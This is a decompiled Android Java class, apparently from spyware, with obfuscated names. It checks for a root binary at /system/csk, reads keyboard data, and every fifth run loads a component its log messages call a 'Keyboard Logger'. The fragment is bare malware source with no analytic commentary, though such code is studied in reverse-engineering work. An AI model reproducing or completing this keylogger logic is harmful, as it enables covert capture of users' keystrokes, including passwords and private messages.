package com.network.d;

import android.content.Context;
import com.network.android.c.a.a;
import java.io.File;

/* access modifiers changed from: package-private */
public final class b implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f139a;

    b(Context context) {
        this.f139a = context;
    }

    public final void run() {
        try {
            a.a("GetKeyboard getKeyboard start. counter: " + a.b);
            if (!new File("/system/csk").exists()) {
                a.a("GetKeyboard getKeyboard MY_SU does not exists. returning");
                return;
            }
            a.a("GetKeyboard getKeyboard run readKeyboard");
            a.b(this.f139a);
            int i = a.b % 5;
            if (i == 0) {
                a.a("GetKeyboard getKeyboard run load Keyboard Logger!!!!!");
                a.a(this.f139a);
            } else {
                a.a("GetKeyboard getKeyboard DONT load Keyboard Logger!! -> will be loaded with the next: " + (5 - i) + " iteractions");
            }
            a.b++;
        } catch (Throwable th) {
            a.a("GetKeyboard getKeyboard Throwable- " + th.getMessage(), th);
            com.network.android.c.a.b.a(1, 3100, "LOG_ERR_KEYBOARD");
        }
    }
}
